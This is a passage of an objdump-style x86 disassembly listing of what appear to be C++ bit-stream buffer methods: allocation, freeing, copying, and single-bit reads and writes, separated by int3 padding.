  405731:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  405738:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40573b:	8b 51 04             	mov    0x4(%ecx),%edx
  40573e:	83 c2 01             	add    $0x1,%edx
  405741:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405744:	89 50 04             	mov    %edx,0x4(%eax)
  405747:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40574a:	8b 11                	mov    (%ecx),%edx
  40574c:	83 c2 01             	add    $0x1,%edx
  40574f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405752:	89 10                	mov    %edx,(%eax)
  405754:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405757:	8b 55 0c             	mov    0xc(%ebp),%edx
  40575a:	8b 42 04             	mov    0x4(%edx),%eax
  40575d:	89 41 08             	mov    %eax,0x8(%ecx)
  405760:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405763:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405766:	89 51 04             	mov    %edx,0x4(%ecx)
  405769:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40576c:	8b e5                	mov    %ebp,%esp
  40576e:	5d                   	pop    %ebp
  40576f:	c2 08 00             	ret    $0x8
  405772:	cc                   	int3
  405773:	cc                   	int3
  405774:	cc                   	int3
  405775:	cc                   	int3
  405776:	cc                   	int3
  405777:	cc                   	int3
  405778:	cc                   	int3
  405779:	cc                   	int3
  40577a:	cc                   	int3
  40577b:	cc                   	int3
  40577c:	cc                   	int3
  40577d:	cc                   	int3
  40577e:	cc                   	int3
  40577f:	cc                   	int3
  405780:	55                   	push   %ebp
  405781:	8b ec                	mov    %esp,%ebp
  405783:	51                   	push   %ecx
  405784:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405787:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40578a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405790:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405793:	c7 41 0c 00 00 00 00 	movl   $0x0,0xc(%ecx)
  40579a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40579d:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  4057a4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4057a7:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4057ae:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4057b2:	74 0c                	je     0x4057c0
  4057b4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4057b7:	51                   	push   %ecx
  4057b8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4057bb:	e8 80 00 00 00       	call   0x405840
  4057c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4057c3:	8b e5                	mov    %ebp,%esp
  4057c5:	5d                   	pop    %ebp
  4057c6:	c2 04 00             	ret    $0x4
  4057c9:	cc                   	int3
  4057ca:	cc                   	int3
  4057cb:	cc                   	int3
  4057cc:	cc                   	int3
  4057cd:	cc                   	int3
  4057ce:	cc                   	int3
  4057cf:	cc                   	int3
  4057d0:	55                   	push   %ebp
  4057d1:	8b ec                	mov    %esp,%ebp
  4057d3:	51                   	push   %ecx
  4057d4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4057d7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4057da:	e8 11 00 00 00       	call   0x4057f0
  4057df:	8b e5                	mov    %ebp,%esp
  4057e1:	5d                   	pop    %ebp
  4057e2:	c3                   	ret
  4057e3:	cc                   	int3
  4057e4:	cc                   	int3
  4057e5:	cc                   	int3
  4057e6:	cc                   	int3
  4057e7:	cc                   	int3
  4057e8:	cc                   	int3
  4057e9:	cc                   	int3
  4057ea:	cc                   	int3
  4057eb:	cc                   	int3
  4057ec:	cc                   	int3
  4057ed:	cc                   	int3
  4057ee:	cc                   	int3
  4057ef:	cc                   	int3
  4057f0:	55                   	push   %ebp
  4057f1:	8b ec                	mov    %esp,%ebp
  4057f3:	83 ec 08             	sub    $0x8,%esp
  4057f6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4057f9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4057fc:	83 38 00             	cmpl   $0x0,(%eax)
  4057ff:	74 14                	je     0x405815
  405801:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405804:	8b 11                	mov    (%ecx),%edx
  405806:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405809:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40580c:	50                   	push   %eax
  40580d:	e8 3a 21 00 00       	call   0x40794c
  405812:	83 c4 04             	add    $0x4,%esp
  405815:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405818:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  40581f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405822:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  405829:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40582c:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  405833:	8b e5                	mov    %ebp,%esp
  405835:	5d                   	pop    %ebp
  405836:	c3                   	ret
  405837:	cc                   	int3
  405838:	cc                   	int3
  405839:	cc                   	int3
  40583a:	cc                   	int3
  40583b:	cc                   	int3
  40583c:	cc                   	int3
  40583d:	cc                   	int3
  40583e:	cc                   	int3
  40583f:	cc                   	int3
  405840:	55                   	push   %ebp
  405841:	8b ec                	mov    %esp,%ebp
  405843:	83 ec 0c             	sub    $0xc,%esp
  405846:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405849:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40584c:	e8 9f ff ff ff       	call   0x4057f0
  405851:	8b 45 08             	mov    0x8(%ebp),%eax
  405854:	c1 e8 03             	shr    $0x3,%eax
  405857:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40585a:	8b 45 08             	mov    0x8(%ebp),%eax
  40585d:	33 d2                	xor    %edx,%edx
  40585f:	b9 08 00 00 00       	mov    $0x8,%ecx
  405864:	f7 f1                	div    %ecx
  405866:	f7 da                	neg    %edx
  405868:	1b d2                	sbb    %edx,%edx
  40586a:	f7 da                	neg    %edx
  40586c:	03 55 fc             	add    -0x4(%ebp),%edx
  40586f:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405872:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405875:	52                   	push   %edx
  405876:	e8 dd 20 00 00       	call   0x407958
  40587b:	83 c4 04             	add    $0x4,%esp
  40587e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405881:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405884:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405887:	89 08                	mov    %ecx,(%eax)
  405889:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40588c:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  405893:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405896:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40589d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4058a0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058a3:	89 51 0c             	mov    %edx,0xc(%ecx)
  4058a6:	8b e5                	mov    %ebp,%esp
  4058a8:	5d                   	pop    %ebp
  4058a9:	c2 04 00             	ret    $0x4
  4058ac:	cc                   	int3
  4058ad:	cc                   	int3
  4058ae:	cc                   	int3
  4058af:	cc                   	int3
  4058b0:	55                   	push   %ebp
  4058b1:	8b ec                	mov    %esp,%ebp
  4058b3:	51                   	push   %ecx
  4058b4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4058b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4058ba:	c1 e0 03             	shl    $0x3,%eax
  4058bd:	50                   	push   %eax
  4058be:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058c1:	e8 7a ff ff ff       	call   0x405840
  4058c6:	8b e5                	mov    %ebp,%esp
  4058c8:	5d                   	pop    %ebp
  4058c9:	c2 04 00             	ret    $0x4
  4058cc:	cc                   	int3
  4058cd:	cc                   	int3
  4058ce:	cc                   	int3
  4058cf:	cc                   	int3
  4058d0:	55                   	push   %ebp
  4058d1:	8b ec                	mov    %esp,%ebp
  4058d3:	83 ec 0c             	sub    $0xc,%esp
  4058d6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4058d9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4058dc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4058df:	8b 50 04             	mov    0x4(%eax),%edx
  4058e2:	2b 51 08             	sub    0x8(%ecx),%edx
  4058e5:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4058e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058eb:	c1 e8 03             	shr    $0x3,%eax
  4058ee:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4058f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058f4:	33 d2                	xor    %edx,%edx
  4058f6:	b9 08 00 00 00       	mov    $0x8,%ecx
  4058fb:	f7 f1                	div    %ecx
  4058fd:	f7 da                	neg    %edx
  4058ff:	1b d2                	sbb    %edx,%edx
  405901:	f7 da                	neg    %edx
  405903:	03 55 f8             	add    -0x8(%ebp),%edx
  405906:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405909:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40590c:	8b e5                	mov    %ebp,%esp
  40590e:	5d                   	pop    %ebp
  40590f:	c3                   	ret
  405910:	55                   	push   %ebp
  405911:	8b ec                	mov    %esp,%ebp
  405913:	83 ec 0c             	sub    $0xc,%esp
  405916:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405919:	33 c0                	xor    %eax,%eax
  40591b:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  40591f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405922:	83 e9 01             	sub    $0x1,%ecx
  405925:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405928:	eb 09                	jmp    0x405933
  40592a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40592d:	83 ea 01             	sub    $0x1,%edx
  405930:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405933:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  405937:	7c 25                	jl     0x40595e
  405939:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40593c:	e8 2f 00 00 00       	call   0x405970
  405941:	0f b7 c0             	movzwl %ax,%eax
  405944:	85 c0                	test   %eax,%eax
  405946:	74 14                	je     0x40595c
  405948:	ba 01 00 00 00       	mov    $0x1,%edx
  40594d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405950:	d3 e2                	shl    %cl,%edx
  405952:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  405956:	0b c2                	or     %edx,%eax
  405958:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  40595c:	eb cc                	jmp    0x40592a
  40595e:	66 8b 45 fc          	mov    -0x4(%ebp),%ax
  405962:	8b e5                	mov    %ebp,%esp
  405964:	5d                   	pop    %ebp
  405965:	c2 04 00             	ret    $0x4
  405968:	cc                   	int3
  405969:	cc                   	int3
  40596a:	cc                   	int3
  40596b:	cc                   	int3
  40596c:	cc                   	int3
  40596d:	cc                   	int3
  40596e:	cc                   	int3
  40596f:	cc                   	int3
  405970:	55                   	push   %ebp
  405971:	8b ec                	mov    %esp,%ebp
  405973:	83 ec 10             	sub    $0x10,%esp
  405976:	56                   	push   %esi
  405977:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40597a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40597d:	8b 48 08             	mov    0x8(%eax),%ecx
  405980:	c1 e9 03             	shr    $0x3,%ecx
  405983:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405986:	03 0a                	add    (%edx),%ecx
  405988:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40598b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40598e:	8a 08                	mov    (%eax),%cl
  405990:	88 4d fb             	mov    %cl,-0x5(%ebp)
  405993:	0f b6 75 fb          	movzbl -0x5(%ebp),%esi
  405997:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40599a:	8b 42 08             	mov    0x8(%edx),%eax
  40599d:	33 d2                	xor    %edx,%edx
  40599f:	b9 08 00 00 00       	mov    $0x8,%ecx
  4059a4:	f7 f1                	div    %ecx
  4059a6:	b9 07 00 00 00       	mov    $0x7,%ecx
  4059ab:	2b ca                	sub    %edx,%ecx
  4059ad:	ba 01 00 00 00       	mov    $0x1,%edx
  4059b2:	d3 e2                	shl    %cl,%edx
  4059b4:	23 f2                	and    %edx,%esi
  4059b6:	f7 de                	neg    %esi
  4059b8:	1b f6                	sbb    %esi,%esi
  4059ba:	f7 de                	neg    %esi
  4059bc:	66 89 75 f4          	mov    %si,-0xc(%ebp)
  4059c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4059c3:	8b 48 08             	mov    0x8(%eax),%ecx
  4059c6:	83 c1 01             	add    $0x1,%ecx
  4059c9:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4059cc:	89 4a 08             	mov    %ecx,0x8(%edx)
  4059cf:	66 8b 45 f4          	mov    -0xc(%ebp),%ax
  4059d3:	5e                   	pop    %esi
  4059d4:	8b e5                	mov    %ebp,%esp
  4059d6:	5d                   	pop    %ebp
  4059d7:	c3                   	ret
  4059d8:	cc                   	int3
  4059d9:	cc                   	int3
  4059da:	cc                   	int3
  4059db:	cc                   	int3
  4059dc:	cc                   	int3
  4059dd:	cc                   	int3
  4059de:	cc                   	int3
  4059df:	cc                   	int3
  4059e0:	55                   	push   %ebp
  4059e1:	8b ec                	mov    %esp,%ebp
  4059e3:	51                   	push   %ecx
  4059e4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4059e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059ea:	83 38 00             	cmpl   $0x0,(%eax)
  4059ed:	75 04                	jne    0x4059f3
  4059ef:	33 c0                	xor    %eax,%eax
  4059f1:	eb 3e                	jmp    0x405a31
  4059f3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4059f6:	e8 45 00 00 00       	call   0x405a40
  4059fb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4059fe:	51                   	push   %ecx
  4059ff:	8b 55 08             	mov    0x8(%ebp),%edx
  405a02:	52                   	push   %edx
  405a03:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a06:	8b 48 04             	mov    0x4(%eax),%ecx
  405a09:	c1 e9 03             	shr    $0x3,%ecx
  405a0c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405a0f:	03 0a                	add    (%edx),%ecx
  405a11:	51                   	push   %ecx
  405a12:	e8 3b 1f 00 00       	call   0x407952
  405a17:	83 c4 0c             	add    $0xc,%esp
  405a1a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a1d:	8b 48 04             	mov    0x4(%eax),%ecx
  405a20:	8b 55 0c             	mov    0xc(%ebp),%edx
  405a23:	8d 04 d1             	lea    (%ecx,%edx,8),%eax
  405a26:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405a29:	89 41 04             	mov    %eax,0x4(%ecx)
  405a2c:	b8 01 00 00 00       	mov    $0x1,%eax
  405a31:	8b e5                	mov    %ebp,%esp
  405a33:	5d                   	pop    %ebp
  405a34:	c2 08 00             	ret    $0x8
  405a37:	cc                   	int3
  405a38:	cc                   	int3
  405a39:	cc                   	int3
  405a3a:	cc                   	int3
  405a3b:	cc                   	int3
  405a3c:	cc                   	int3
  405a3d:	cc                   	int3
  405a3e:	cc                   	int3
  405a3f:	cc                   	int3
  405a40:	55                   	push   %ebp
  405a41:	8b ec                	mov    %esp,%ebp
  405a43:	83 ec 10             	sub    $0x10,%esp
  405a46:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405a49:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405a4c:	83 78 08 08          	cmpl   $0x8,0x8(%eax)
  405a50:	73 05                	jae    0x405a57
  405a52:	e9 86 00 00 00       	jmp    0x405add
  405a57:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405a5a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405a5d:	8b 41 04             	mov    0x4(%ecx),%eax
  405a60:	3b 42 08             	cmp    0x8(%edx),%eax
  405a63:	75 16                	jne    0x405a7b
  405a65:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405a68:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  405a6f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405a72:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  405a79:	eb 62                	jmp    0x405add
  405a7b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405a7e:	e8 4d fe ff ff       	call   0x4058d0
  405a83:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a86:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405a89:	8b 40 08             	mov    0x8(%eax),%eax
  405a8c:	33 d2                	xor    %edx,%edx
  405a8e:	b9 08 00 00 00       	mov    $0x8,%ecx
  405a93:	f7 f1                	div    %ecx
  405a95:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405a98:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405a9b:	8b 42 08             	mov    0x8(%edx),%eax
  405a9e:	2b 45 f8             	sub    -0x8(%ebp),%eax
  405aa1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405aa4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405aa7:	51                   	push   %ecx
  405aa8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405aab:	8b 42 08             	mov    0x8(%edx),%eax
  405aae:	c1 e8 03             	shr    $0x3,%eax
  405ab1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405ab4:	03 01                	add    (%ecx),%eax
  405ab6:	50                   	push   %eax
  405ab7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405aba:	8b 02                	mov    (%edx),%eax
  405abc:	50                   	push   %eax
  405abd:	e8 90 1e 00 00       	call   0x407952
  405ac2:	83 c4 0c             	add    $0xc,%esp
  405ac5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405ac8:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405acb:	89 51 08             	mov    %edx,0x8(%ecx)
  405ace:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405ad1:	8b 48 04             	mov    0x4(%eax),%ecx
  405ad4:	2b 4d f4             	sub    -0xc(%ebp),%ecx
  405ad7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405ada:	89 4a 04             	mov    %ecx,0x4(%edx)
  405add:	8b e5                	mov    %ebp,%esp
  405adf:	5d                   	pop    %ebp
  405ae0:	c3                   	ret
  405ae1:	cc                   	int3
  405ae2:	cc                   	int3
  405ae3:	cc                   	int3
  405ae4:	cc                   	int3
  405ae5:	cc                   	int3
  405ae6:	cc                   	int3
  405ae7:	cc                   	int3
  405ae8:	cc                   	int3
  405ae9:	cc                   	int3
  405aea:	cc                   	int3
  405aeb:	cc                   	int3
  405aec:	cc                   	int3
  405aed:	cc                   	int3
  405aee:	cc                   	int3
  405aef:	cc                   	int3
  405af0:	55                   	push   %ebp
  405af1:	8b ec                	mov    %esp,%ebp
  405af3:	51                   	push   %ecx
  405af4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405af7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405afb:	75 0b                	jne    0x405b08
  405afd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b00:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405b06:	eb 0c                	jmp    0x405b14
  405b08:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405b0b:	51                   	push   %ecx
  405b0c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405b0f:	e8 2c 00 00 00       	call   0x405b40
  405b14:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b17:	8b e5                	mov    %ebp,%esp
  405b19:	5d                   	pop    %ebp
  405b1a:	c2 04 00             	ret    $0x4
  405b1d:	cc                   	int3
  405b1e:	cc                   	int3
  405b1f:	cc                   	int3
  405b20:	55                   	push   %ebp
  405b21:	8b ec                	mov    %esp,%ebp
  405b23:	51                   	push   %ecx
  405b24:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405b27:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405b2a:	e8 81 00 00 00       	call   0x405bb0
  405b2f:	8b e5                	mov    %ebp,%esp
  405b31:	5d                   	pop    %ebp
  405b32:	c3                   	ret
  405b33:	cc                   	int3
  405b34:	cc                   	int3
  405b35:	cc                   	int3
  405b36:	cc                   	int3
  405b37:	cc                   	int3
  405b38:	cc                   	int3
  405b39:	cc                   	int3
  405b3a:	cc                   	int3
  405b3b:	cc                   	int3
  405b3c:	cc                   	int3
  405b3d:	cc                   	int3
  405b3e:	cc                   	int3
  405b3f:	cc                   	int3
  405b40:	55                   	push   %ebp
  405b41:	8b ec                	mov    %esp,%ebp
  405b43:	83 ec 08             	sub    $0x8,%esp
  405b46:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405b49:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b4c:	e8 5f 00 00 00       	call   0x405bb0
  405b51:	8b 45 08             	mov    0x8(%ebp),%eax
  405b54:	c1 e8 03             	shr    $0x3,%eax
  405b57:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b5a:	89 41 08             	mov    %eax,0x8(%ecx)
  405b5d:	8b 45 08             	mov    0x8(%ebp),%eax
  405b60:	33 d2                	xor    %edx,%edx
  405b62:	b9 08 00 00 00       	mov    $0x8,%ecx
  405b67:	f7 f1                	div    %ecx
  405b69:	f7 da                	neg    %edx
  405b6b:	1b d2                	sbb    %edx,%edx
  405b6d:	f7 da                	neg    %edx
  405b6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405b72:	03 50 08             	add    0x8(%eax),%edx
  405b75:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b78:	89 51 08             	mov    %edx,0x8(%ecx)
  405b7b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405b7e:	8b 42 08             	mov    0x8(%edx),%eax
  405b81:	50                   	push   %eax
  405b82:	e8 d1 1d 00 00       	call   0x407958
  405b87:	83 c4 04             	add    $0x4,%esp
  405b8a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b8d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b90:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405b93:	89 11                	mov    %edx,(%ecx)
  405b95:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405b98:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  405b9f:	b8 01 00 00 00       	mov    $0x1,%eax
  405ba4:	8b e5                	mov    %ebp,%esp
  405ba6:	5d                   	pop    %ebp
  405ba7:	c2 04 00             	ret    $0x4
  405baa:	cc                   	int3
  405bab:	cc                   	int3
  405bac:	cc                   	int3
  405bad:	cc                   	int3
  405bae:	cc                   	int3
  405baf:	cc                   	int3
  405bb0:	55                   	push   %ebp
  405bb1:	8b ec                	mov    %esp,%ebp
  405bb3:	83 ec 08             	sub    $0x8,%esp
  405bb6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405bb9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405bbc:	83 38 00             	cmpl   $0x0,(%eax)
  405bbf:	74 14                	je     0x405bd5
  405bc1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405bc4:	8b 11                	mov    (%ecx),%edx
  405bc6:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405bc9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405bcc:	50                   	push   %eax
  405bcd:	e8 7a 1d 00 00       	call   0x40794c
  405bd2:	83 c4 04             	add    $0x4,%esp
  405bd5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405bd8:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  405bde:	8b e5                	mov    %ebp,%esp
  405be0:	5d                   	pop    %ebp
  405be1:	c3                   	ret
  405be2:	cc                   	int3
  405be3:	cc                   	int3
  405be4:	cc                   	int3
  405be5:	cc                   	int3
  405be6:	cc                   	int3
  405be7:	cc                   	int3
  405be8:	cc                   	int3
  405be9:	cc                   	int3
  405bea:	cc                   	int3
  405beb:	cc                   	int3
  405bec:	cc                   	int3
  405bed:	cc                   	int3
  405bee:	cc                   	int3
  405bef:	cc                   	int3
  405bf0:	55                   	push   %ebp
  405bf1:	8b ec                	mov    %esp,%ebp
  405bf3:	83 ec 0c             	sub    $0xc,%esp
  405bf6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405bf9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405bfc:	83 38 00             	cmpl   $0x0,(%eax)
  405bff:	75 07                	jne    0x405c08
  405c01:	33 c0                	xor    %eax,%eax
  405c03:	e9 b2 00 00 00       	jmp    0x405cba
  405c08:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405c0b:	83 e9 01             	sub    $0x1,%ecx
  405c0e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405c11:	eb 09                	jmp    0x405c1c
  405c13:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405c16:	83 ea 01             	sub    $0x1,%edx
  405c19:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405c1c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405c20:	0f 8c 8f 00 00 00    	jl     0x405cb5
  405c26:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405c29:	8b 48 04             	mov    0x4(%eax),%ecx
  405c2c:	c1 e9 03             	shr    $0x3,%ecx
  405c2f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405c32:	03 0a                	add    (%edx),%ecx
  405c34:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405c37:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  405c3b:	ba 01 00 00 00       	mov    $0x1,%edx
  405c40:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405c43:	d3 e2                	shl    %cl,%edx
  405c45:	23 c2                	and    %edx,%eax
  405c47:	74 2c                	je     0x405c75
  405c49:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405c4c:	8b 40 04             	mov    0x4(%eax),%eax
  405c4f:	33 d2                	xor    %edx,%edx
  405c51:	b9 08 00 00 00       	mov    $0x8,%ecx
  405c56:	f7 f1                	div    %ecx
  405c58:	b9 07 00 00 00       	mov    $0x7,%ecx
  405c5d:	2b ca                	sub    %edx,%ecx
  405c5f:	ba 01 00 00 00       	mov    $0x1,%edx
  405c64:	d3 e2                	shl    %cl,%edx
  405c66:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c69:	0f b6 08             	movzbl (%eax),%ecx
  405c6c:	0b ca                	or     %edx,%ecx
  405c6e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405c71:	88 0a                	mov    %cl,(%edx)
  405c73:	eb 2c                	jmp    0x405ca1
  405c75:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405c78:	8b 40 04             	mov    0x4(%eax),%eax
  405c7b:	33 d2                	xor    %edx,%edx
  405c7d:	b9 08 00 00 00       	mov    $0x8,%ecx
  405c82:	f7 f1                	div    %ecx
  405c84:	b9 07 00 00 00       	mov    $0x7,%ecx
  405c89:	2b ca                	sub    %edx,%ecx
  405c8b:	ba 01 00 00 00       	mov    $0x1,%edx
  405c90:	d3 e2                	shl    %cl,%edx
  405c92:	f7 d2                	not    %edx
  405c94:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c97:	0f b6 08             	movzbl (%eax),%ecx
  405c9a:	23 ca                	and    %edx,%ecx
  405c9c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405c9f:	88 0a                	mov    %cl,(%edx)
  405ca1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405ca4:	8b 48 04             	mov    0x4(%eax),%ecx
  405ca7:	83 c1 01             	add    $0x1,%ecx
  405caa:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405cad:	89 4a 04             	mov    %ecx,0x4(%edx)
  405cb0:	e9 5e ff ff ff       	jmp    0x405c13
  405cb5:	b8 01 00 00 00       	mov    $0x1,%eax
  405cba:	8b e5                	mov    %ebp,%esp
  405cbc:	5d                   	pop    %ebp
  405cbd:	c2 08 00             	ret    $0x8
  405cc0:	55                   	push   %ebp
  405cc1:	8b ec                	mov    %esp,%ebp
  405cc3:	83 ec 08             	sub    $0x8,%esp
  405cc6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405cc9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405ccc:	8b 48 04             	mov    0x4(%eax),%ecx
  405ccf:	c1 e9 03             	shr    $0x3,%ecx
  405cd2:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405cd5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405cd8:	8b 42 04             	mov    0x4(%edx),%eax
  405cdb:	33 d2                	xor    %edx,%edx
  405cdd:	b9 08 00 00 00       	mov    $0x8,%ecx
  405ce2:	f7 f1                	div    %ecx
  405ce4:	f7 da                	neg    %edx
  405ce6:	1b d2                	sbb    %edx,%edx
  405ce8:	f7 da                	neg    %edx
  405cea:	03 55 fc             	add    -0x4(%ebp),%edx
  405ced:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405cf0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405cf3:	8b e5                	mov    %ebp,%esp
  405cf5:	5d                   	pop    %ebp
  405cf6:	c3                   	ret
  405cf7:	cc                   	int3
